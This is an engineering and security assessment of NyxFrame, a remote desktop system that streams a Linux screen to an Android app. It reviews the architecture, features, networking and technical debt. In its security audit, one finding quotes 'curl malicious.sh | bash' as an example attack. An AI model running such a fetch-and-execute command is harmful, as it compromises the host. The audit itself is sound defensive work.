# NyxFrame — Complete Engineering Analysis Report

---

## 1. Executive Summary

| Attribute | Assessment |
|---|---|
| **Project** | Remote Linux desktop control from Android — real-time H.264 screen streaming + touch/keyboard input injection + file transfer |
| **Maturity** | Early functional prototype. Working end-to-end pipeline exists but has critical gaps |
| **Completion** | ~40% |
| **Working Features** | H.264 capture → encode → WebSocket transport → MediaCodec decode → TextureView render; Touch-to-mouse mapping; i3 workspace switching; File upload/download; Macro system; Custom theme engine; LAN/Tailscale discovery |
| **Missing Features** | X11 capturer is **stub** (returns black dummy frames); Wayland capture works but requires user approval dialog each session; No NVENC hardware encoding; No reconnection logic on Rust side (Go has it); No audio; No clipboard sync from server→client; No multi-monitor support; No production security (no TLS, no auth); No AI agent system |
| **Architecture Quality** | Good — clean multi-process separation (Rust capture/input + Go network gateway + Android client). Well-defined UDS protocol. Dual codec support (H.264/MJPEG). Dual transport (WebSocket/WebRTC) |
| **Technical Debt** | Moderate. X11 capturer is empty stub. Some dead code (`useWebRtc` always false). Go server has MJPEG code that's likely unused. i3-specific assumptions hardcoded. No tests |
| **Risk Level** | **High** — the critical X11 capture path is not implemented (dummy data), Wayland capture needs pipewire portal user approval, NVENC config exists but never used |

---

## 2. Repository Structure

```
NyxFrame/
├── android/                          # Android Kotlin/Jetpack Compose app
│   ├── app/
│   │   ├── build.gradle.kts          # Android app config (minSdk 26, targetSdk 34, Compose)
│   │   └── src/main/
│   │       ├── AndroidManifest.xml    # Internet + network state permissions
│   │       ├── assets/config.json     # Workspace layout, discovery hostnames, port
│   │       └── java/com/nyxframe/app/
│   │           ├── MainActivity.kt    # NavHost: connect → stream → settings
│   │           ├── data/
│   │           │   ├── websocket/
│   │           │   │   └── WebSocketManager.kt     # OkHttp WS client (commands + stream)
│   │           │   └── webrtc/
│   │           │       ├── H264Decoder.kt           # Android MediaCodec H.264 decoder
│   │           │       ├── WebRtcManager.kt         # Pion/WebRTC data channel client
│   │           │       └── PipelineTracker.kt       # First-frame logging helper
│   │           ├── ui/
│   │           │   ├── screens/
│   │           │   │   ├── ConnectScreen.kt         # Discovery, connect, file browser
│   │           │   │   ├── StreamScreen.kt          # Live viewport, controls, keyboard
│   │           │   │   └── SettingsScreen.kt        # Themes, macros, streaming config
│   │           │   └── viewmodel/
│   │           │       └── AgentViewModel.kt        # Central state — 1630 lines
│   │           └── /* No tests found */
│   ├── build.gradle.kts
│   ├── settings.gradle.kts
│   └── config.json                    # Active Android config (gitignored)
│
├── server/
│   ├── config.json                    # Active server config (gitignored)
│   ├── config.json.example
│   ├── go/                            # Go network gateway
│   │   ├── go.mod / go.sum
│   │   └── main.go                    # Single-file server — 1792 lines
│   └── rust/                          # Rust capture/input engine
│       ├── Cargo.toml
│       └── src/
│           ├── main.rs                # Entry point, pipeline orchestration — 907 lines
│           ├── capture/
│           │   ├── mod.rs             # ScreenCapturer enum, auto_select()
│           │   ├── x11.rs             # ⚠️ STUB — returns empty 1920×1080 black frame
│           │   └── wayland.rs         # Working PipeWire/GStreamer + ashpd portal
│           ├── input/
│           │   ├── mod.rs
│           │   └── uinput.rs          # /dev/uinput virtual input device driver
│           ├── ipc/
│           │   ├── mod.rs
│           │   └── uds.rs             # Unix Domain Socket server + frame/command protocol
│           └── env_recovery.rs        # DISPLAY/WAYLAND_DISPLAY env detection
│
├── docs/
│   ├── System-Architecture.md
│   ├── Video-Streaming-Engine.md
│   ├── Getting-Started.md
│   ├── Macros-and-Automation.md
│   ├── Input-Emulation.md
│   ├── System-Robustness-and-Troubleshooting.md
│   ├── CHANGELOG.md
│   └── photos/ (8 UI screenshots)
│
├── build_server.sh                    # Rust + Go build script
├── build_android.sh                   # Gradle APK build script
├── build_and_install_android.sh       # Build + ADB install
├── package.json                       # Only "sharp" dep (icon generation)
├── generate_icons.py
├── fix_settings.py
├── update_headers.py
├── nyxframe-server                    # Prebuilt Rust binary
├── nyxframe-2.1-release.apk           # Prebuilt APK
├── logo.png / favicon.png
├── .gitignore
└── LICENSE
```

---

## 3. Technology Stack Audit

### Frontend (Android)
| Component | Technology | Version |
|---|---|---|
| Language | Kotlin | — |
| UI Framework | Jetpack Compose + Material3 | BOM 2024.02 |
| Architecture | MVVM (AndroidViewModel) | — |
| Navigation | Navigation Compose | 2.7.7 |
| WebSocket | OkHttp | 4.12.0 |
| Serialization | Gson | 2.10.1 |
| WebRTC | webrtc-sdk-android | 104.5112.10 |
| Video Decode | MediaCodec (hardware, H.264/AVC) | Platform |
| File Access | DocumentFile / SAF | — |
| Persistence | SharedPreferences | — |
| Async | Coroutines + viewModelScope | — |
| **Tests** | **Not found** | — |

### Desktop Server — Rust Engine
| Component | Technology | Version |
|---|---|---|
| Language | Rust | 2021 edition |
| Runtime | Tokio (full) | 1.37 |
| H.264 Encoding | openh264 (Cisco) | 0.4.4 |
| X11 Capture | xcb (shm + randr) | 1.2 |
| Wayland Capture | gstreamer + gstreamer-app + gstreamer-video | 0.22 |
| Portal API | ashpd (tokio) | 0.9 |
| Serialization | serde + serde_json | 1.0 |
| Input Injection | /dev/uinput (raw ioctl) | — |
| IPC | Unix Domain Socket (tokio) | — |
| **NVENC** | **Config struct defined but never instantiated** | — |

### Desktop Server — Go Gateway
| Component | Technology | Version |
|---|---|---|
| Language | Go | 1.26.3 |
| WebSocket | gorilla/websocket | 1.5.3 |
| WebRTC | pion/webrtc | v3 |
| JPEG Encoding | pixiv/go-libjpeg | CGO |
| Input | xdotool (subprocess) | — |
| Clipboard | xclip (subprocess) | — |
| Window Manager | i3-msg (subprocess) | — |

### Infrastructure
| Component | Technology | Notes |
|---|---|---|
| Inter-process | Unix Domain Socket | `/tmp/nyxframe3.sock`, 0666 perms |
| Transport | WebSocket (primary) / WebRTC DataChannel (alternative, not used) | |
| Discovery | ADB broadcast + TCP port scan (/24) + Tailscale DNS | |
| VPN | Tailscale (MagicDNS, CGNAT range detection) | |
| Config | JSON files (gitignored) | |

### Dependency Map
```
Android (Kotlin/Compose)
    ├── OkHttp ─── WebSocket ──┐
    │                           ├─── Go Gateway (port 9090)
    ├── Gson ───────────────────┘       │
    ├── MediaCodec (H.264)              │ (UDS /tmp/nyxframe3.sock)
    ├── TextureView (GPU render)        │
    └── DocumentFile (SAF)              ├── Rust Engine (root daemon)
                                            ├── openh264 (H.264 encode)
                                            ├── xcb (X11 capture - STUB)
                                            ├── gstreamer (Wayland/PipeWire capture)
                                            └── /dev/uinput (input injection)
```

---

## 4. Current Feature Inventory

| Feature | Status | Quality | Dependencies | Issues |
|---|---|---|---|---|
| **X11 Screen Capture** | **BROKEN (stub)** | Poor | xcb, MIT-SHM | Returns all-black 1920×1080 buffer — no actual X11 MIT-SHM implementation |
| **Wayland/PipeWire Capture** | Complete | Good | gstreamer, ashpd, pipewire | Requires user portal approval each session |
| **OpenH264 Encoding** | Complete | Good | openh264 crate | Software encoding, ~5 Mbps target |
| **NVENC Encoding** | **Not implemented** | N/A | FFmpeg, NVIDIA driver | Config struct exists, code path never reached |
| **MJPEG Fallback** | Complete | Good | go-libjpeg (CGO) | Fallback when codec != "h264" |
| **UDS Frame Transport** | Complete | Excellent | tokio UDS | 20-byte header protocol, async split streams |
| **WebSocket Streaming** | Complete | Excellent | gorilla/websocket, OkHttp | Ping-based keepalive, frame dropping support |
| **WebRTC Streaming** | **Prototype** | Average | pion/webrtc, Google WebRTC SDK | `useWebRtc` hardcoded to false; missing ICE/STUN config |
| **Android H.264 Decode** | Complete | Good | MediaCodec | Surface decoding, zero-copy GPU render |
| **TextureView Rendering** | Complete | Good | Android TextureView | Zoom/pan/lock with scissor clipping |
| **uinput Input Injection** | Complete | Good | /dev/uinput | Kernel-level virtual mouse + keyboard |
| **xdotool Input Fallback** | Complete | Good | xdotool | FIFO sequential queue, dedup logger |
| **Touch → Mouse Mapping** | Complete | Good | Compose gesture detection | Absolute + relative modes, modifier key support |
| **i3 Workspace Control** | Complete | Good | i3-msg | Window manager IPC via subprocess |
| **Keyboard Macros** | Complete | Good | Custom Kotlin executor | JSON/TOML/YAML import/export, server sync |
| **Clipboard Sync (client→server)** | Complete | Average | xclip | One-way; no server→client clipboard |
| **File Upload** | Complete | Good | Multipart HTTP, SAF | Recursive folder upload, progress tracking |
| **File Download** | Complete | Good | ZIP streaming, SAF | Single/multi file + folder download |
| **LAN Discovery** | Complete | Good | TCP port scan /24 | 16 concurrent probes, 150ms timeout |
| **Tailscale Discovery** | Complete | Good | MagicDNS + CGNAT check | Hostname + domain resolution |
| **ADB Discovery** | Complete | Good | Android BroadcastReceiver | USB-tethered discovery |
| **Custom Theme Engine** | Complete | Excellent | 2D HSV color picker canvas | 5 presets, persisting, 4-color token system |
| **Stream Stats Display** | Complete | Good | FPS/bitrate tracker | Last 2s sliding window |
| **Backpressure Pacing** | Complete | Good | Dynamic FPS adjustment | 40%+ drops → 20 FPS, etc. |
| **Privilege Dropping** | Complete | Good | SUDO_UID/GID parsing | Rust drops to user before spawning Go |
| **Go Watchdog** | Complete | Good | Exponential backoff respawn | Max 30s backoff |
| **Environment Recovery** | Complete | Excellent | loginctl, systemd, /proc | Scans compositor, bus, display env |
| **Diagnostics Mode** | Complete | Good | --diagnostics flag | Validates backends before running |
| **Multi-format Logging** | Complete | Good | tee to file + stdout | Datestamped log files |
| **AI Agent System** | **Not found** | N/A | N/A | No AI modules, no agent system |
| **Voice Assistant** | **Not found** | N/A | N/A | Not implemented |
| **Multi-device Management** | **Not found** | N/A | N/A | Single-device only |
| **Audio Streaming** | **Not found** | N/A | N/A | Video-only |
| **TLS/SSL** | **Not found** | N/A | N/A | Cleartext HTTP/WS only |
| **Authentication** | **Not found** | N/A | N/A | No auth whatsoever |
| **Tests** | **Not found** | N/A | N/A | Zero unit/integration tests |

---

## 5. Streaming Pipeline Analysis

```
┌─────────────────────────────────────────────────────────────────┐
│                        WORKSTATION HOST                         │
│                                                                 │
│  ┌──────────────┐    ┌──────────────┐    ┌───────────────────┐  │
│  │ X11 MIT-SHM  │    │ Wayland      │    │ NVENC (planned)   │  │
│  │ (STUB/STUB)  │    │ PipeWire     │    │ not implemented   │  │
│  └──────┬───────┘    └──────┬───────┘    └───────────────────┘  │
│         │                   │                                    │
│         ▼                   ▼                                    │
│  ┌─────────────────────────────────────────────────┐            │
│  │           Rust Capture Engine                    │            │
│  │   BGRA pixels @ native resolution (1920×1080)   │            │
│  └─────────────────────┬───────────────────────────┘            │
│                        │                                         │
│                        ▼                                         │
│  ┌─────────────────────────────────────────────────┐            │
│  │      BGRA → RGB → FullRangeYUVBuffer            │            │
│  │      (integer coefficients, SIMD-friendly)      │            │
│  └─────────────────────┬───────────────────────────┘            │
│                        │                                         │
│                        ▼                                         │
│  ┌─────────────────────────────────────────────────┐            │
│  │           OpenH264 Encoder                       │            │
│  │   H.264 Annex B (SPS/PPS/IDR + P/B slices)      │            │
│  │   5 Mbps target, keyframe every 300 frames       │            │
│  └─────────────────────┬───────────────────────────┘            │
│                        │                                         │
│                        ▼                                         │
│  ┌─────────────────────────────────────────────────┐            │
│  │   UDS Frame Protocol: [20B hdr][H.264 payload]  │            │
│  │   w=4B, h=4B, ts=8B, len=4B, payload=...       │            │
│  └─────────────────────┬───────────────────────────┘            │
│                        │  Unix Domain Socket                     │
│                        ▼                                         │
│  ┌─────────────────────────────────────────────────┐            │
│  │          Go Gateway Server                       │            │
│  │  parseFrameStream() → pipeline channel →         │            │
│  │  broadcastFrame() to all WS/WebRTC clients      │            │
│  └─────────────────────┬───────────────────────────┘            │
│                        │  WebSocket (port 9090)                  │
├────────────────────────┼─────────────────────────────────────────┤
│                        ▼                                         │
│  ┌─────────────────────────────────────────────────┐            │
│  │              ANDROID DEVICE                      │            │
│  │                                                  │            │
│  │  WebSocketManager (OkHttp)                       │            │
│  │       │                                          │            │
│  │       ▼                                          │            │
│  │  H264Decoder (MediaCodec)                        │            │
│  │       │ Surface (zero-copy GPU)                  │            │
│  │       ▼                                          │            │
│  │  TextureView (Jetpack Compose)                   │            │
│  │       │ graphicsLayer(scale, translate)          │            │
│  │       ▼                                          │            │
│  │  User sees 60 FPS GPU-rendered desktop           │            │
│  └──────────────────────────────────────────────────┘            │
└──────────────────────────────────────────────────────────────────┘
```

### Bottlenecks

1. **X11 capture is a stub** — `x11.rs` returns `vec![0; 1920*1080*4]` (all zeros). No MIT-SHM implementation exists despite the docs claiming it does.
2. **Wayland capture requires user approval** — `ashpd` portal shows a screen sharing dialog each session. Not headless-friendly.
3. **OpenH264 is software-only** — 5 Mbps target at 1080p60 will consume significant CPU (~20-40% on modern x86).
4. **No frame dropping in H.264 mode** — `pipeline` channel has 128 buffer slots; if Go is slow, Rust blocks on `send_frame`.
5. **SPS/PPS injection is fragile** — Go caches and prepends SPS/PPS to IDR frames that lack them. This is a workaround for a non-periodic-keyframe issue in OpenH264.
6. **NVENC code path defined but never executed** — `nvenc_settings` in config, no code that uses FFmpeg NVENC.
7. **No audio pipeline** — streaming is video-only.

### Reconnection Logic
- **Go side**: Exponential backoff for UDS reconnection. Good.
- **Android side**: Debounced 1.5s reconnect in `AgentViewModel`. Good.
- **Rust side**: Session teardown on Go disconnect, but loops back to `accept()`. No graceful periodicity without Go connection — capturer keeps encoding and sending frames that are never received.

---

## 6. Desktop Agent Analysis

### Process Architecture
```
┌─────────────────────────────────────────────────────┐
│  SUDO ./nyxframe-server                              │
│                                                      │
│  ┌─────────────────────────────────────────────┐    │
│  │  Rust Process (root)                        │    │
│  │                                             │    │
│  │  1. Recover environment (DISPLAY, XAUTH)    │    │
│  │  2. Auto-select capture backend             │    │
│  │  3. Open /dev/uinput (virtual HID)          │    │
│  │  4. Bind UDS at /tmp/nyxframe3.sock         │    │
│  │  5. Compile + spawn Go gateway (dropped to  │    │
│  │     user privileges via SUDO_UID/GID)       │    │
│  │  6. ADB broadcast for USB discovery         │    │
│  │  7. Accept UDS connection + main loop       │    │
│  │     │                                        │    │
│  │     ├── Command task (read UDS commands)     │    │
│  │     │      ├── StreamConfig → encoder config │    │
│  │     │      ├── Key → uinput inject_key       │    │
│  │     │      ├── MouseRelative → rel move     │    │
│  │     │      ├── MouseAbsolute → abs move     │    │
│  │     │      ├── MouseClick → btn press       │    │
│  │     │      └── MouseScroll → scroll wheel   │    │
│  │     │                                        │    │
│  │     └── Capture task (screen → encode → send)│    │
│  │           60 FPS pacing, force keyframe      │    │
│  └─────────────────────┬───────────────────────┘    │
│                        │ UDS                         │
│  ┌─────────────────────▼───────────────────────┐    │
│  │  Go Process (standard user)                 │    │
│  │  Watchdog: auto-respawn on crash            │    │
│  │                                             │    │
│  │  HTTP Server :9090                          │    │
│  │  ├── /ws        → command WebSocket         │    │
│  │  ├── /stream    → video WebSocket           │    │
│  │  ├── /offer     → WebRTC SDP exchange      │    │
│  │  ├── /api/stream/config  → stream settings  │    │
│  │  ├── /api/macros/export  → macro backup     │    │
│  │  ├── /api/macros/import  → macro restore   │    │
│  │  ├── /api/fs/list        → directory list   │    │
│  │  ├── /api/fs/upload      → file upload      │    │
│  │  ├── /api/fs/download    → file download    │    │
│  │  └── /api/fs/mkdir       → create folder    │    │
│  │                                             │    │
│  │  xdotoolQueue (channel, 1000 cap)           │    │
│  │  startXdotoolWorker() → sequential FIFO     │    │
│  │  startPipelineBroadcaster() → frame distro  │    │
│  │  startBackpressureMonitor() → dynamic FPS   │    │
│  └─────────────────────────────────────────────┘    │
└─────────────────────────────────────────────────────┘
```

### Services/Modules
- **Environment Recovery** (`env_recovery.rs`): Reconstructs DISPLAY, XAUTHORITY, WAYLAND_DISPLAY, D-Bus session from loginctl, systemd, /proc. Confidence scoring for backend selection.
- **Screen Capturer** (`capture/`): Dual-backend enum with auto-select. Wayland: working. X11: stub.
- **Input Engine** (`input/uinput.rs`): Full kernel-level virtual HID device. Handles keys (1-248), mouse (relative + absolute), buttons, scroll.
- **IPC Layer** (`ipc/uds.rs`): Async UDS server with tagged command enum, frame send helper, command read helper.
- **Go Gateway** (`main.go`): HTTP/WS server, UDS client, frame broadcaster, xdotool executor, backpressure monitor, file server.

### Stability Assessment
- **Go Watchdog**: Good — exponential backoff respawn (capped at 30s).
- **Rust panic safety**: Session-level `capture_task.abort()` on command task failure. Individual command panics caught in `execute_command`.
- **UDS Reconnection**: Go reconnects with exponential backoff (250ms → 8s). Rust loops on accept.
- **No graceful shutdown on SIGTERM**: Missing signal handler for clean teardown of uinput device and UDS socket.

### Extensibility
- Adding new input types: Add variant to `Command` enum in `uds.rs`, handler in `execute_command()` in `main.rs`, new command type in Go `handleCommand()`.
- Adding new capture backends: Implement `{Backend}Capturer` with `new()` and `capture_frame()`, add variant to `ScreenCapturer` enum, register in `auto_select()`.
- Adding new API endpoints: Add `http.HandleFunc()` in Go `main()`.

---

## 7. Mobile Application Analysis

### Navigation Architecture
```
NavHost (startDestination = "connect")
├── "connect"   → ConnectScreen   (discovery, connect, file browser)
├── "stream"    → StreamScreen    (live viewport, controls, keyboard)
└── "settings"  → SettingsScreen  (themes, macros, streaming config)
```

### State Management
- Single `AgentViewModel` (1630 lines) holds ALL application state — a ViewModel anti-pattern.
- Uses `mutableStateOf` + `mutableStateListOf` for Compose reactivity.
- Owns `WebSocketManager`, `WebRtcManager`, `H264Decoder` as direct fields.

### Streaming Screen (`StreamScreen.kt` — 1577 lines)
- Over-engineered gesture handling with 4 separate `pointerInput` modifiers: tap, transform gestures, long-press drag, pointer event counting.
- `TextureView` wrapped in `AndroidView` for GPU H.264 rendering.
- Custom zoom/pan/lock system with scissor clipping to safe height (70%).
- Virtual mouse cursor rendered as Canvas crosshair with direction indicators.
- Bottom control deck: workspace selector, modifier keys (CTRL/ALT/SHIFT/SUPER), system keys (ESC/TAB/BKSP/arrows), keyboard input, clipboard history.
- **Issue**: 1577 lines in a single composable is extremely high — should be decomposed.

### Settings Screen (`SettingsScreen.kt` — 1900+ lines)
- Port configuration, navigation mode (direct touch vs trackpad), zoom scale.
- Streaming performance (backpressure on/off).
- 5 cyberpunk preset themes + interactive 2D HSV color picker canvas with draggable color targets.
- Full macro editor with JSON/TOML/YAML export/import.
- Remote sync to/from server with detailed log output.
- Cache/device maintenance.

### Key Issues
1. **Single ViewModel anti-pattern**: All state in one 1630-line file. Responsibilities should be split (connection, streaming, macros, files, themes).
2. **No dependency injection**: Manual construction of all managers.
3. **No error state handling for UI**: Most errors logged but not surfaced to user.
4. **`useWebRtc` hardcoded to false**: WebRTC code path is dead code.
5. **No loading/error composition**: UI assumes managers always work.
6. **Massive screen files**: `StreamScreen` (1577 lines) and `SettingsScreen` (1900+ lines) should be decomposed into components.
7. **Missing tests**: Zero tests across the entire Android app.

---

## 8. Networking Architecture

### Connection Establishment
```
Android                             Go Gateway                    Rust Engine
   │                                    │                            │
   │  WS connect(host:9090/ws)           │                            │
   │────────────────────────────────────►│                            │
   │  WS open (isConnected=true)         │                            │
   │◄────────────────────────────────────│                            │
   │                                    │                            │
   │  syncStreamingConfig (POST /api)    │                            │
   │────────────────────────────────────►│                            │
   │                                    │  forwardCommandToUds()     │
   │                                    │───────────────────────────►│
   │  WS connect(host:9090/stream)       │                            │
   │────────────────────────────────────►│                            │
   │                                    │  accept() UDS              │
   │                                    │◄────────────────────────────│
   │                                    │  send_frame() @ 60 FPS     │
   │  BinaryMessage (H.264 NAL units)   │◄────────────────────────────│
   │◄────────────────────────────────────│                            │
   │                                    │                            │
   │  sendCommand("mouseabsolute",...)   │                            │
   │────────────────────────────────────►│                            │
   │                                    │  read_command() → uinput   │
   │                                    │───────────────────────────►│
```

### Device Discovery
```
Method 1: Manual IP/hostname entry → DNS resolution + TCP connect :9090
Method 2: LAN scan → enumerate local IPs → for each /24: 150ms TCP probe :9090
Method 3: Tailscale MagicDNS → resolve "nyx.tailscale.net" → TCP probe
Method 4: ADB broadcast → Rust sends Android Intent with IPs via USB
```

### NAT Traversal
- **Current**: No NAT traversal. Works only on LAN or Tailscale overlay.
- **Tailscale readiness**: Tailscale interface detection and CGNAT IP range (100.64.0.0/10) detection already implemented in both Go and Rust.
- **WebRTC readiness**: STUN server configured (`stun:stun.l.google.com:19302`), but `useWebRtc` is hardcoded `false`. TURN not configured.

### Authentication Flow
- **None**. Zero authentication. Any device on the network can connect to port 9090 and:
  - View the full desktop stream
  - Inject keyboard/mouse events
  - Browse and download files
  - Execute arbitrary shell commands via text injection macros

### Encryption Flow
- **None**. Cleartext WebSocket (`ws://`) and HTTP. No TLS.
- `AndroidManifest.xml` has `usesCleartextTraffic="true"` (needed for cleartext).

---

## 9. AI Readiness Assessment

| Criterion | Score | Evidence |
|---|---|---|
| AI/Agent Modules | 0/10 | No AI modules found anywhere in the codebase |
| Tool System | 2/10 | Command system exists (type/key_code/pressed) but is for input emulation only, not AI tool use |
| LLM Integration | 0/10 | No LLM calls, no model loading, no prompt handling |
| Agent Framework | 0/10 | No LangChain, LangGraph, OpenAI, or any agent framework |
| Command Execution | 6/10 | Go has a `xdotoolQueue` for sequential command execution — could serve as execution substrate |
| Streaming Integration | 7/10 | Video pipeline could provide visual context to AI |
| File System Access | 6/10 | REST APIs for file read/write/list already exist |
| Clipboard Access | 5/10 | One-way clipboard (client→server) exists |

**Overall AI Readiness: 2/10**

The project would need a complete AI layer built from scratch. The existing command pipeline and streaming infrastructure provide a decent substrate, but no AI-specific code exists.

### Integration Complexity Estimates
| System | Complexity | Notes |
|---|---|---|
| OpenHands | **High** | Would need to run CodeAct agent as subprocess, pipe through existing command system |
| LangGraph | **High** | Would need to embed Python/JS runtime or call external API |
| Local Agents (e.g., Ollama) | **Medium** | Could add REST API calls from Go gateway |
| Voice Assistant | **High** | Would need Android speech recognition, agent command routing |
| Desktop AI Agent (screen understanding) | **Medium** | Could pipe captured frames to vision model; streaming pipeline already exists |

---

## 10. Security Audit

### Critical Issues
| # | Issue | Location | Impact |
|---|---|---|---|
| C1 | **No authentication** | Go gateway :9090 | Anyone on the network can view screen, inject input, browse file system, download/upload files |
| C2 | **No encryption (TLS)** | All HTTP/WS endpoints | All traffic in cleartext — passwords, clipboard, file contents visible on network |
| C3 | **Arbitrary command injection via text macros** | Go `handleCommand("text")` → `xdotool type` | Any connected client can type arbitrary shell commands in terminal, including `curl malicious.sh \| bash` |
| C4 | **Full file system access** | Go `/api/fs/*` | No path restriction beyond clean/dotfile filter. Can browse `/etc`, `/proc`, any user directory |

### High Issues
| # | Issue | Location | Impact |
|---|---|---|---|
| H1 | **No origin check on WebSocket** | Go `CheckOrigin: func(r *http.Request) bool { return true }` | CSRF attacks, any website can open WS to the server |
| H2 | **No input rate limiting** | Go command WS | Attacker can flood xdotool queue (1000 cap, then drops) |
| H3 | **`usesCleartextTraffic="true"`** | AndroidManifest | Allows cleartext HTTP/WS, no TLS enforced |
| H4 | **UDS socket 0666 permissions** | Rust UDS | World-readable/writable socket — any local process can inject commands or read video frames |

### Medium Issues
| # | Issue | Location |
|---|---|---|
| M1 | Server config contains IP/port info but is gitignored | Proper |
| M2 | No session management — single connection, no user identity | Design |
| M3 | ADB broadcast can leak host IP to USB-connected devices | Rust |
| M4 | `/dev/uinput` requires root — running entire Rust daemon as root | Design tradeoff |

### Low Issues
| # | Issue | Location |
|---|---|---|
| L1 | SharedPreferences without encryption for saved host IPs | Android |
| L2 | No log rotation — logs grow unbounded in /var/log/nyxframe | Rust |
| L3 | Debug logging exposes NAL type counts in production | Rust |

---

## 11. Code Quality Audit

| Category | Score (/10) | Assessment |
|---|---|---|
| **Architecture** | 7/10 | Clean multi-process separation. UDS protocol well-defined. Dual codec/transport design. Single ViewModel is the main anti-pattern |
| **Separation of Concerns** | 5/10 | Go is single 1792-line file. AgentViewModel is 1630 lines. StreamScreen 1577 lines. SettingsScreen 1900+ lines |
| **Modularity** | 6/10 | Rust is well-modularized (capture/, input/, ipc/). Go is monolithic. Android has reasonable package structure but massive files |
| **Error Handling** | 6/10 | Go has guard clauses (G1-G10 comments), timeout contexts, dimension validation. Rust has fallible capture paths. Android errors are mostly logged, not shown to user |
| **Documentation** | 7/10 | 8 markdown docs, inline comments throughout. Docs describe architecture that doesn't match code (X11 MIT-SHM docs but stub impl) |
| **Logging** | 8/10 | Comprehensive: Rust env_logger, Go dedup logger, Android Log.i/e, file logging with tee, log rotation needed |
| **Testing** | **0/10** | Zero tests across the entire project. No unit, integration, or E2E tests |
| **Code Style** | 7/10 | Consistent naming. Rust uses idiomatic patterns. Go is well-structured within single file. Android Kotlin follows Compose conventions |
| **Performance** | 7/10 | Frame pipeline uses channels, pools, async I/O. Integer YUV conversion. MediaCodec surface decoding. Buffer pools in Go |
| **Configuration Management** | 8/10 | JSON config files, gitignored with .example templates. Android assets config. SharedPreferences for user prefs |

**Overall Code Quality: 6.1/10**

---

## 12. Technical Debt Report

### Quick Wins (<1 day)

| Priority | Task | Effort | Location |
|---|---|---|---|
| P0 | Implement X11 MIT-SHM capture (currently empty stub) | 1 day | `server/rust/src/capture/x11.rs` |
| P0 | Add proper XCB initialization with MIT-SHM, get image, return real pixels | 1 day | Same |
| P1 | Remove dead `useWebRtc = false` code path or make it toggleable | 2 hours | `AgentViewModel.kt` |
| P1 | Remove MJPEG codec path if not needed | 2 hours | Go `main.go:parseFrameStream()` |
| P2 | Add `Content-Type` header to all HTTP responses | 1 hour | Go |
| P2 | Fix `width()`/`height()` returning hardcoded 1920×1080 in capture/mod.rs | 1 hour | `capture/mod.rs` |

### Small Tasks (1-3 days)

| Priority | Task | Effort | Location |
|---|---|---|---|
| P1 | Add SIGTERM/SIGINT signal handler for graceful Rust shutdown | 1 day | `main.rs` |
| P1 | Decompose AgentViewModel into focused ViewModels | 2 days | Android |
| P2 | Decompose StreamScreen into 5-6 component files | 2 days | Android |
| P2 | Decompose SettingsScreen into 5-6 component files | 2 days | Android |
| P2 | Add server↔client clipboard sync (currently one-way) | 2 days | Go + Android |
| P2 | Replace hardcoded i3-msg with configurable WM interface | 1 day | Go |
| P3 | Add log rotation (size-based or date-based) | 1 day | Rust `main.rs` |
| P3 | Add proper error activity to Android UI | 2 days | Android |

### Medium Tasks (3-7 days)

| Priority | Task | Effort |
|---|---|---|
| P0 | Add unit tests for Rust capture, IPC, Go handlers, Android ViewModel | 5 days |
| P1 | Add WebRTC with ICE/TURN support for NAT traversal | 5 days |
| P1 | Implement NVENC hardware encoding path (FFmpeg subprocess) | 4 days |
| P1 | Add mDNS/Zeroconf discovery (Avahi) | 3 days |
| P2 | Replace i3-specific workspace control with EWMH/NetWM standard | 5 days |
| P2 | Add audio streaming pipeline (PulseAudio → Opus → WebSocket) | 5 days |
| P3 | Implement multi-monitor capture support | 4 days |
| P3 | Split Go monolith into multiple packages/files | 3 days |

### Large Refactors (1-4 weeks)

| Priority | Task | Effort |
|---|---|---|
| P0 | Add TLS + authentication to all endpoints | 1-2 weeks |
| P0 | Add integration test suite (headless Xvfb + Android emulator) | 2 weeks |
| P1 | Implement NAT traversal with STUN/TURN + Tailscale Funnel | 2 weeks |
| P2 | CI/CD pipeline (GitHub Actions for Rust, Go, Android) | 1 week |

### Critical Blockers
| # | Blocker | Reason |
|---|---|---|
| 1 | **X11 capturer is stub** | Project cannot function on X11 — the primary desktop environment. Wayland requires user approval. Product cannot ship |
| 2 | **Zero security (no auth, no TLS)** | Cannot deploy to any untrusted network. Clipboard, files, commands are all exposed |
| 3 | **Zero tests** | Any refactor risks regression with no safety net |

---

## 13. Open Source Reuse Assessment

| OSS Project | Currently Used | Integration Complexity | Notes |
|---|---|---|---|
| **RustDesk** | Inspiration only | Medium | Would need to replace custom UDS protocol with RustDesk's protocol, adopt their codec pipeline |
| **Sunshine** | Not used | Medium | Could use Sunshine's NVENC/AMF encoding, WebRTC signaling, and existing Android Moonlight client |
| **Moonlight** | Not used | High | GameStream protocol is different; would need separate client |
| **Tailscale** | Manual detection | Low | Already detects Tailscale interfaces and CGNAT IPs. Integration is awareness-level |
| **Headscale** | Not used | Low | Could self-host Tailscale control server; existing Tailscale logic would work unchanged |
| **OpenHands** | Not used | High | Would need to containerize and expose CodeAct agent via Go API |
| **LangGraph** | Not used | High | Would need Python runtime integration or REST bridge |
| **WebRTC (Pion)** | Yes (Go) | — | Currently hardcoded off. Could enable with TURN configuration |
| **OpenH264** | Yes (Rust) | — | Software H.264 encoder — working |
| **GStreamer** | Yes (Rust, optional) | — | Wayland/PipeWire capture — working |
| **xdotool/xclip** | Yes (Go) | — | X11 input injection — working |
| **OkHttp** | Yes (Android) | — | WebSocket client — working |
| **MediaCodec** | Yes (Android) | — | H.264 hardware decode — working |

---

## 14. Gap Analysis Against Product Vision

| Vision Feature | Current State | Missing | Effort |
|---|---|---|---|
| **Remote desktop streaming** | Working (H.264 + WebSocket + MediaCodec) | X11 capture is stub; no NVENC; no audio; no multi-monitor | 1-2 weeks |
| **Touch control** | Complete | — | — |
| **Keyboard control** | Complete (system keys, text injection, direct mode) | — | — |
| **File transfer** | Complete (upload/download, zip streaming) | — | — |
| **Terminal access** | Not implemented | No integrated terminal; text injection can type in terminals but no dedicated terminal view | 2-4 weeks |
| **AI desktop agent** | Not implemented | No AI system, no tool system, no agent framework, no LLM integration | 2-3 months |
| **Voice assistant** | Not implemented | No ASR, no TTS, no intent routing | 1-2 months |
| **Multi-device management** | Not implemented | Single-device only; no device list, no persistent config per device | 2-4 weeks |
| **Developer workflow automation** | Partial | Macros exist but are key-sequence only; no IDE integration, no git automation, no CI triggers | 1-2 months |

---

## 15. Recommended Architecture Going Forward

### Keep (no changes needed)
- **Multi-process architecture** (Rust capture/input + Go network gateway + Android client). This is the right design.
- **UDS protocol** with frame header + command packet format. Well-designed.
- **MediaCodec H.264 surface decoding** — industry best practice for Android.
- **Dual transport design** (WebSocket + WebRTC) — provides fallback options.
- **Backpressure/pacing system** — dynamic FPS adjustment is important.
